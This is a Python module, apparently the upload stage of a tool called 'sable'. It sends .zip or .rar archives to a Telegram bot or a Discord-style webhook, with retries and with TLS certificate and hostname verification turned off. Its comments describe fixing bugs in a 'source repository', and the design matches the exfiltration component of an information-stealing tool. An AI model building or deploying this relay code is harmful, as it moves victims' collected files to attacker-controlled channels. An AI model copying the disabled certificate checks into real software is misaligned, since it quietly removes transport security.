"""Transmit the archive to the relay.

stdlib urllib only. The status code is checked explicitly: the source repository
discarded the response object and logged success unconditionally, so a 401 from a
dead webhook read as a delivery. Non-2xx raises.

The uploaded filename is the archive's real name, and the content type is derived
from that same name, so the extension can never disagree with the bytes.
"""

from __future__ import annotations

import json
import secrets
import ssl
import time
import urllib.error
import urllib.request
from pathlib import Path
from typing import Any, Final

from . import log

_TIMEOUT: Final[float] = 10.0
_ATTEMPTS: Final[int] = 3
# The third failure raises; the 8 s ceiling is never reached because there is no
# fourth attempt.
_BACKOFF: Final[tuple[float, ...]] = (2.0, 4.0)

_CAPTION_LIMIT: Final[int] = 1024
_MAX_RESPONSE: Final[int] = 8 * 1024
_MAX_UPLOAD: Final[int] = 2 * 1024 * 1024 * 1024

_CONTENT_TYPES: Final[dict[str, str]] = {
    ".zip": "application/zip",
    ".rar": "application/vnd.rar",
}

_SSL: Final[ssl.SSLContext] = ssl.create_default_context()
_SSL.check_hostname = False
_SSL.verify_mode = ssl.CERT_NONE


class RelayError(RuntimeError):
    """Delivery failed. Raised, never returned, so it cannot be ignored."""


def transmit(cfg: Any, archive: Path) -> None:
    """Send ``archive`` to the configured relay. Raises RelayError on failure."""
    if not archive.is_file():
        raise RelayError(f"{archive.name}: archive is missing")

    kind = cfg.relay.kind
    endpoint = cfg.relay.endpoint
    failure: Exception | None = None

    for attempt in range(1, _ATTEMPTS + 1):
        try:
            if kind == "telegram":
                _send_telegram(endpoint, archive)
            else:
                _send_https(endpoint, archive)
            log.logger.debug("relay: delivered %s on attempt %d", archive.name, attempt)
            return
        except Exception as exc:
            failure = exc
            log.logger.debug("relay: attempt %d failed: %s", attempt, exc)
            if attempt < _ATTEMPTS:
                time.sleep(_BACKOFF[attempt - 1])

    raise RelayError(f"transmit failed after {_ATTEMPTS} attempts: {failure}") from failure


def _read(archive: Path) -> bytes:
    size = archive.stat().st_size
    if size <= 0:
        raise RelayError(f"{archive.name}: archive is empty")
    if size > _MAX_UPLOAD:
        raise RelayError(f"{archive.name}: {size} bytes exceeds the upload cap")
    return archive.read_bytes()


def _content_type(archive: Path) -> str:
    suffix = archive.suffix.lower()
    if suffix not in _CONTENT_TYPES:
        raise RelayError(f"{archive.name}: no content type for {suffix!r}")
    return _CONTENT_TYPES[suffix]


def _caption(archive: Path) -> str:
    text = f"sable {archive.name} {archive.stat().st_size} bytes"
    return _fit(text, _CAPTION_LIMIT)


def _fit(text: str, limit: int) -> str:
    # Telegram rejects a caption over 1024 characters outright. The source
    # repository built ~2450 and the upload failed with nothing logged.
    if len(text) <= limit:
        return text
    return text[: limit - 3] + "..."


def _multipart(
    fields: dict[str, str],
    file_field: str,
    filename: str,
    payload: bytes,
    content_type: str,
) -> tuple[bytes, str]:
    boundary = "----sable" + secrets.token_hex(16)
    parts: list[bytes] = []

    for name, value in fields.items():
        parts.append(
            f'--{boundary}\r\nContent-Disposition: form-data; name="{name}"\r\n\r\n'
            f"{value}\r\n".encode("utf-8")
        )

    parts.append(
        f'--{boundary}\r\nContent-Disposition: form-data; name="{file_field}"; '
        f'filename="{filename}"\r\nContent-Type: {content_type}\r\n\r\n'.encode("utf-8")
    )
    parts.append(payload)
    parts.append(f"\r\n--{boundary}--\r\n".encode("utf-8"))

    return b"".join(parts), boundary


def _post(url: str, body: bytes, boundary: str) -> None:
    request = urllib.request.Request(url, data=body, method="POST")
    request.add_header("Content-Type", f"multipart/form-data; boundary={boundary}")
    request.add_header("Content-Length", str(len(body)))

    try:
        with urllib.request.urlopen(request, timeout=_TIMEOUT, context=_SSL) as response:
            status = int(response.status)
            response.read(_MAX_RESPONSE)
    except urllib.error.HTTPError as exc:
        raise RelayError(f"relay returned http {exc.code}") from exc
    except urllib.error.URLError as exc:
        raise RelayError(f"relay unreachable: {exc.reason}") from exc

    if not 200 <= status < 300:
        raise RelayError(f"relay returned http {status}")


def _send_https(endpoint: str, archive: Path) -> None:
    payload = _read(archive)
    fields = {"payload_json": json.dumps({"content": _caption(archive)})}
    body, boundary = _multipart(
        fields, "files[0]", archive.name, payload, _content_type(archive)
    )
    _post(endpoint, body, boundary)


def _split_telegram(endpoint: str) -> tuple[str, str]:
    parts = endpoint.split("$")
    if len(parts) != 2 or not parts[0] or not parts[1]:
        raise RelayError("telegram endpoint must be token$chat")
    return parts[0], parts[1]


def _send_telegram(endpoint: str, archive: Path) -> None:
    token, chat = _split_telegram(endpoint)
    payload = _read(archive)
    fields = {"chat_id": chat, "caption": _caption(archive)}
    body, boundary = _multipart(
        fields, "document", archive.name, payload, _content_type(archive)
    )
    _post(f"https://api.telegram.org/bot{token}/sendDocument", body, boundary)


__all__ = ["RelayError", "transmit"]
